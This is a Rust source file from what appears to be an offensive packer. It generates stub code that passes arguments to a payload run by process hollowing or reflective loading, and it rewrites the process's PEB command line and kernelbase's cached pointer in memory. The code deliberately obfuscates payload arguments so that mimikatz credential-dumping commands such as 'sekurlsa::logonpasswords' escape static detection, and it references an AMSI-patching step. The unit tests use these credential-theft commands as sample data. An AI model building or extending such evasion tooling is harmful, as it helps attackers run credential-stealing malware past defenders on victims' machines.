//! Payload runtime arguments.
//!
//! A packed binary is not the payload: it is a stub that decrypts the payload
//! and runs it. The payload must still see a command line, built from two
//! sources:
//!
//! - the fixed arguments declared in the YAML (`build.payload.args`), and
//! - the arguments the operator passes to the packed binary itself (`argv[1..]`).
//!
//! `build.payload.args_mode` decides how they combine ([`ArgsMode::Join`] by
//! default: YAML first, runtime after; [`ArgsMode::Override`]: the runtime args
//! replace the YAML ones when present).
//!
//! This module renders the shared `$ARGS_BLOCK$` that both execution techniques
//! use, so the argument algebra and the Windows quoting live in one place:
//!
//! - [`build_command_line`]: `process_hollowing` passes the result as
//!   `lpCommandLine` to `CreateProcessA` (token 0 is the target's exe name).
//! - [`patch_command_line`]: `reflective_loading` rewrites the *current*
//!   process's `RTL_USER_PROCESS_PARAMETERS.CommandLine` (the value
//!   `GetCommandLineW` returns) before mapping the payload, because the payload
//!   runs in this very process.
//!
//! Every YAML argument is rebuilt at runtime through [`StringsConfig`], so the
//! literals never appear in cleartext in the binary.

use serde::{Deserialize, Serialize};

use crate::techniques::{Category, RuntimeStep};

use super::obfuscation::StringsConfig;

/// How `build.payload.args` combine with the packed binary's runtime args.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ArgsMode {
    /// YAML args first, then the runtime args (default).
    #[default]
    Join,
    /// The runtime args replace the YAML ones when any is present.
    Override,
}

impl ArgsMode {
    /// Lowercase label used in the build summary.
    pub fn label(self) -> &'static str {
        match self {
            ArgsMode::Join => "join",
            ArgsMode::Override => "override",
        }
    }
}

/// Whether the active pipeline needs the shared argument helpers.
///
/// Only Execution techniques build a payload command line, so a
/// preparation-only pipeline (or an empty one) gets no block at all.
pub fn needed(pipeline: &[RuntimeStep]) -> bool {
    pipeline
        .iter()
        .any(|step| step.category() == Category::Execution)
}

/// Renders the `$ARGS_BLOCK$` fragment for the given payload configuration.
///
/// Emits an empty string when no active technique executes the payload.
pub fn render_block(
    yaml_args: &[String],
    mode: ArgsMode,
    pipeline: &[RuntimeStep],
    strings: &StringsConfig,
) -> String {
    if !needed(pipeline) {
        return String::new();
    }

    // Each YAML arg becomes a runtime-reconstructed `String` expression, so a
    // suspicious literal (e.g. a mimikatz module) never lands in `.rdata`.
    let defs = if yaml_args.is_empty() {
        "vec![]".to_string()
    } else {
        let mut body = String::from("vec![\n");
        for (i, arg) in yaml_args.iter().enumerate() {
            let expr = strings
                .obfuscate(arg)
                .render_stub_expr(&format!("payload_arg_{i}"));
            body.push_str(&format!("            {expr},\n"));
        }
        body.push_str("        ]");
        body
    };

    let mode_def = match mode {
        ArgsMode::Join => "ArgsMode::Join",
        ArgsMode::Override => "ArgsMode::Override",
    };

    ARGS_BLOCK
        .replace("$YAML_ARGS_DEF$", &defs)
        .replace("$ARGS_MODE_DEF$", mode_def)
}

/// The block body. It is wrapped in `mod payload_args` so its `use`/items
/// cannot collide with the technique fragments injected into the same file, and
/// the two entry points are re-exported so the fragments call
/// `crate::build_command_line` / `crate::patch_command_line`.
const ARGS_BLOCK: &str = r##"mod payload_args {
    /// How the YAML args combine with the runtime args (`build.payload.args_mode`).
    #[allow(dead_code)]
    #[derive(Clone, Copy, PartialEq, Eq)]
    enum ArgsMode {
        Join,
        Override,
    }

    /// The resolved `build.payload.args_mode`.
    const ARGS_MODE: ArgsMode = $ARGS_MODE_DEF$;

    /// The `build.payload.args` from the YAML, rebuilt at runtime.
    fn yaml_args() -> Vec<String> {
        $YAML_ARGS_DEF$
    }

    /// The arguments passed to the packed binary itself (`argv[1..]`).
    ///
    /// `args_os` is used instead of `args` because the latter panics on a
    /// non-Unicode argument; a Windows command line is ANSI/UTF-16 anyway.
    fn runtime_args() -> Vec<String> {
        std::env::args_os()
            .skip(1)
            .map(|arg| arg.to_string_lossy().into_owned())
            .collect()
    }

    /// The final argument list handed to the payload, applying `args_mode`.
    fn resolve() -> Vec<String> {
        let runtime = runtime_args();
        match ARGS_MODE {
            ArgsMode::Join => {
                let mut all = yaml_args();
                all.extend(runtime);
                all
            }
            ArgsMode::Override => {
                if runtime.is_empty() {
                    yaml_args()
                } else {
                    runtime
                }
            }
        }
    }

    /// Quotes one argument following the rules `CommandLineToArgvW` reverses.
    ///
    /// An argument without a space, tab or quote is passed through unchanged;
    /// otherwise it is wrapped in quotes and its backslashes/quotes are escaped.
    fn quote(arg: &str) -> String {
        if !arg.is_empty() && !arg.contains([' ', '\t', '"']) {
            return arg.to_string();
        }
        let mut out = String::from("\"");
        let mut backslashes = 0usize;
        for ch in arg.chars() {
            match ch {
                '\\' => backslashes += 1,
                '"' => {
                    for _ in 0..(2 * backslashes + 1) {
                        out.push('\\');
                    }
                    out.push('"');
                    backslashes = 0;
                }
                _ => {
                    for _ in 0..backslashes {
                        out.push('\\');
                    }
                    backslashes = 0;
                    out.push(ch);
                }
            }
        }
        for _ in 0..(2 * backslashes) {
            out.push('\\');
        }
        out.push('"');
        out
    }

    /// The resolved payload arguments, without the executable token.
    ///
    /// `dotnet_hosting` hands these to the managed entry point as its
    /// `string[]`; the command-line builders use the same list behind
    /// [`build_command_line`].
    pub fn payload_arguments() -> Vec<String> {
        resolve()
    }

    /// Builds `<exe> <resolved args>` as a Windows command line.
    ///
    /// Token 0 is always the executable name, never an argument: Windows
    /// components (and the payload's own `argv[0]`) read it from there. A
    /// payload that wants only the arguments must drop `argv[0]`
    /// (`CommandLineToArgvW` does this for it).
    pub fn build_command_line(exe: &str) -> String {
        let mut line = quote(exe);
        for arg in resolve() {
            line.push(' ');
            line.push_str(&quote(&arg));
        }
        crate::tech_dbg!("payload_args", "command line: {line}");
        line
    }

    /// The first token of the current process's command line (its exe path).
    fn current_exe_token() -> String {
        if let Some(token) = std::env::args_os().next() {
            let token = token.to_string_lossy().into_owned();
            if !token.is_empty() {
                return token;
            }
        }
        std::env::current_exe()
            .ok()
            .and_then(|path| path.file_name().map(|name| name.to_string_lossy().into_owned()))
            .unwrap_or_default()
    }

    /// Rewrites the current process's command line to `<exe> <args>`.
    ///
    /// Two places have to be updated, because on recent Windows
    /// `GetCommandLineW` does not read `RTL_USER_PROCESS_PARAMETERS` on every
    /// call:
    ///
    /// - `PEB->ProcessParameters->CommandLine`, the `UNICODE_STRING` PEB-reading
    ///   tools see, and
    /// - the pointer `kernelbase` cached at process start and returns from
    ///   `GetCommandLineW` (which the payload's CRT uses to build `argv`).
    ///
    /// The cached pointer is located by value, so no version-specific offset is
    /// hardcoded; on older Windows it does not exist and the PEB write alone is
    /// enough. The new buffer is leaked on purpose: it must stay alive for the
    /// rest of the process.
    pub fn patch_command_line() -> Result<(), String> {
        let line = build_command_line(&current_exe_token());
        let mut wide: Vec<u16> = line.encode_utf16().collect();
        let chars = wide.len() as u16;
        wide.push(0);
        let buffer = wide.leak();

        let peb = unsafe { current_peb() };
        if peb.is_null() {
            return Err("could not read the PEB".to_string());
        }
        // PEB->ProcessParameters is a pointer at PEB + 0x20 on x64, +0x10 on x86.
        let params = unsafe { peb.add(PROCESS_PARAMETERS_OFFSET).cast::<*mut u8>().read() };
        if params.is_null() {
            return Err("the process parameters are not initialized".to_string());
        }
        // RTL_USER_PROCESS_PARAMETERS->CommandLine is a UNICODE_STRING at +0x70
        // on x64, +0x40 on x86: Length (u16), MaximumLength (u16), padding
        // (u32), Buffer (*mut u16). Length excludes the terminating NUL.
        let command_line = unsafe { params.add(COMMAND_LINE_OFFSET) };
        let previous = unsafe { command_line.add(8).cast::<*mut u16>().read() };
        let previous_length = unsafe { command_line.cast::<u16>().read() };
        unsafe {
            command_line.cast::<u16>().write(chars * 2);
            command_line.add(2).cast::<u16>().write(chars * 2 + 2);
            command_line
                .add(8)
                .cast::<*mut u16>()
                .write(buffer.as_mut_ptr());
        }

        unsafe {
            redirect_cached_command_line(previous, previous_length, buffer.as_mut_ptr(), chars * 2);
        }
        crate::tech_dbg!("payload_args", "PEB command line repointed at the payload args");
        Ok(())
    }

    /// Repoints `kernelbase`'s cached command-line pointer from `previous` to
    /// `new`. A no-op when the cache does not exist (older Windows) or the
    /// pointer is not found.
    unsafe fn redirect_cached_command_line(
        previous: *const u16,
        previous_length: u16,
        new: *mut u16,
        length: u16,
    ) {
        if previous.is_null() || previous == new {
            return;
        }
        let Ok(module) = windows::Win32::System::LibraryLoader::GetModuleHandleA(
            windows::core::PCSTR(c"kernelbase.dll".as_ptr() as *const u8),
        ) else {
            return;
        };
        let base = module.0 as usize;
        let size = module_image_size(base);
        let old = previous as usize;
        for offset in (0..size).step_by(std::mem::size_of::<usize>()) {
            let slot = (base + offset) as *mut usize;
            if slot.read_unaligned() != old {
                continue;
            }
            // If the cache is `UNICODE_STRING`-shaped, keep its lengths in sync
            // (only when they match the previous command line, so an unrelated
            // pointer that happens to hit is left alone).
            if offset >= 8 {
                let length_slot = ((base + offset - 8) as *mut u16).read_unaligned();
                if length_slot == previous_length {
                    ((base + offset - 8) as *mut u16).write_unaligned(length);
                    ((base + offset - 6) as *mut u16).write_unaligned(length + 2);
                }
            }
            slot.write_unaligned(new as usize);
        }
    }

    /// `PEB->ProcessParameters` offset: `0x10` on x86, `0x20` on x64.
    const PROCESS_PARAMETERS_OFFSET: usize = if cfg!(target_arch = "x86") { 0x10 } else { 0x20 };

    /// `RTL_USER_PROCESS_PARAMETERS->CommandLine` offset: `0x40` on x86, `0x70`
    /// on x64 (the 32-bit structure is 12 bytes narrower up to that field).
    const COMMAND_LINE_OFFSET: usize = if cfg!(target_arch = "x86") { 0x40 } else { 0x70 };

    /// Reads the current thread's PEB (x64: `gs:[0x60]`).
    #[cfg(target_arch = "x86_64")]
    unsafe fn current_peb() -> *mut u8 {
        let peb: *mut u8;
        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, preserves_flags, readonly));
        peb
    }

    /// Reads the current thread's PEB (x86: `fs:[0x30]`).
    #[cfg(target_arch = "x86")]
    unsafe fn current_peb() -> *mut u8 {
        let peb: *mut u8;
        core::arch::asm!("mov {}, fs:[0x30]", out(reg) peb, options(nostack, preserves_flags, readonly));
        peb
    }

    /// Reads `SizeOfImage` from a module's PE header.
    unsafe fn module_image_size(base: usize) -> usize {
        if base == 0 {
            return 0;
        }
        let e_lfanew = *((base + 0x3c) as *const u32) as usize;
        *((base + e_lfanew + 0x50) as *const u32) as usize
    }
}

#[allow(unused_imports)]
use payload_args::{build_command_line, patch_command_line, payload_arguments};
"##;

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::obfuscation::{StringStrategy, StringsConfig};
    use crate::techniques::RuntimeStep;

    fn xor_config() -> StringsConfig {
        StringsConfig {
            strategy: StringStrategy::Xor,
            key: Some([0x5Au8; 32]),
        }
    }

    fn stack_config() -> StringsConfig {
        StringsConfig {
            strategy: StringStrategy::Stack,
            key: None,
        }
    }

    fn execution() -> Vec<RuntimeStep> {
        vec![serde_yml::from_str("technique: reflective_loading\n").expect("step")]
    }

    fn preparation() -> Vec<RuntimeStep> {
        vec![serde_yml::from_str("technique: patch_amsi\n").expect("step")]
    }

    // --- packer-side mirrors ---------------------------------------------------
    //
    // The emitted block is the authoritative implementation (covered by the
    // ignored e2e tests in `tests/cli.rs`). These mirrors keep the algebra
    // unit-tested without compiling a stub.

    fn resolve(yaml: &[String], mode: ArgsMode, runtime: Vec<String>) -> Vec<String> {
        match mode {
            ArgsMode::Join => {
                let mut all = yaml.to_vec();
                all.extend(runtime);
                all
            }
            ArgsMode::Override => {
                if runtime.is_empty() {
                    yaml.to_vec()
                } else {
                    runtime
                }
            }
        }
    }

    fn quote(arg: &str) -> String {
        if !arg.is_empty() && !arg.contains([' ', '\t', '"']) {
            return arg.to_string();
        }
        let mut out = String::from("\"");
        let mut backslashes = 0usize;
        for ch in arg.chars() {
            match ch {
                '\\' => backslashes += 1,
                '"' => {
                    for _ in 0..(2 * backslashes + 1) {
                        out.push('\\');
                    }
                    out.push('"');
                    backslashes = 0;
                }
                _ => {
                    for _ in 0..backslashes {
                        out.push('\\');
                    }
                    backslashes = 0;
                    out.push(ch);
                }
            }
        }
        for _ in 0..(2 * backslashes) {
            out.push('\\');
        }
        out.push('"');
        out
    }

    #[test]
    fn join_puts_yaml_args_before_runtime_args() {
        let yaml = vec!["privilege::debug".to_string(), "log".to_string()];
        let runtime = vec!["sekurlsa::logonpasswords".to_string()];
        assert_eq!(
            resolve(&yaml, ArgsMode::Join, runtime),
            vec!["privilege::debug", "log", "sekurlsa::logonpasswords"]
        );
    }

    #[test]
    fn join_without_runtime_args_keeps_the_yaml_args() {
        let yaml = vec!["a".to_string(), "b".to_string()];
        assert_eq!(resolve(&yaml, ArgsMode::Join, vec![]), vec!["a", "b"]);
    }

    #[test]
    fn override_replaces_the_yaml_args_when_runtime_args_exist() {
        let yaml = vec!["a".to_string(), "b".to_string()];
        let runtime = vec!["c".to_string()];
        assert_eq!(resolve(&yaml, ArgsMode::Override, runtime), vec!["c"]);
    }

    #[test]
    fn override_without_runtime_args_falls_back_to_the_yaml_args() {
        let yaml = vec!["a".to_string(), "b".to_string()];
        assert_eq!(resolve(&yaml, ArgsMode::Override, vec![]), vec!["a", "b"]);
    }

    #[test]
    fn quote_leaves_simple_arguments_untouched() {
        assert_eq!(quote("privilege::debug"), "privilege::debug");
        assert_eq!(quote("C:\\temp\\out.log"), "C:\\temp\\out.log");
    }

    #[test]
    fn quote_wraps_arguments_with_spaces() {
        assert_eq!(quote("hello world"), "\"hello world\"");
        assert_eq!(quote(""), "\"\"");
    }

    #[test]
    fn quote_escapes_embedded_quotes_and_trailing_backslashes() {
        assert_eq!(quote("say \"hi\""), "\"say \\\"hi\\\"\"");
        // A trailing backslash must be doubled so it is not taken as escaping
        // the closing quote (the argument needs a space to be quoted at all).
        assert_eq!(quote("dir x\\"), "\"dir x\\\\\"");
    }

    // --- rendered block --------------------------------------------------------

    #[test]
    fn needed_only_for_an_execution_technique() {
        assert!(needed(&execution()));
        assert!(!needed(&preparation()));
        assert!(!needed(&[]));
    }

    #[test]
    fn an_unneeded_block_is_empty() {
        let block = render_block(&[], ArgsMode::Join, &preparation(), &xor_config());
        assert!(block.is_empty(), "unexpected block: {block}");
    }

    #[test]
    fn emits_the_mode_and_the_helpers() {
        let block = render_block(
            &["a".to_string()],
            ArgsMode::Override,
            &execution(),
            &xor_config(),
        );
        assert!(block.contains("const ARGS_MODE: ArgsMode = ArgsMode::Override;"));
        assert!(block.contains("pub fn build_command_line"));
        assert!(block.contains("pub fn patch_command_line"));
        assert!(
            block.contains(
                "use payload_args::{build_command_line, patch_command_line, payload_arguments};"
            ),
            "helpers not re-exported: {block}"
        );
        // No internal placeholder may survive.
        assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
    }

    #[test]
    fn yaml_args_are_obfuscated() {
        let args = vec![
            "privilege::debug".to_string(),
            "sekurlsa::logonpasswords".to_string(),
        ];
        let block = render_block(&args, ArgsMode::Join, &execution(), &xor_config());
        for arg in &args {
            assert!(
                !block.contains(arg.as_str()),
                "cleartext argument '{arg}' leaked: {block}"
            );
        }
        assert!(block.contains("crate::dec_xor"));
        assert_eq!(
            block.matches("crate::dec_xor").count(),
            args.len(),
            "every argument must be emitted: {block}"
        );
    }

    #[test]
    fn stack_strategy_avoids_the_decoder() {
        let args = vec!["sekurlsa::logonpasswords".to_string()];
        let block = render_block(&args, ArgsMode::Join, &execution(), &stack_config());
        assert!(!block.contains("dec_xor"));
        assert!(!block.contains("sekurlsa::logonpasswords"));
        assert!(block.contains("std::hint::black_box"));
    }

    #[test]
    fn no_args_still_renders_an_empty_vec() {
        let block = render_block(&[], ArgsMode::Join, &execution(), &xor_config());
        assert!(block.contains("fn yaml_args() -> Vec<String>"));
        assert!(
            block.contains("vec![]"),
            "expected an empty arg list: {block}"
        );
    }
}
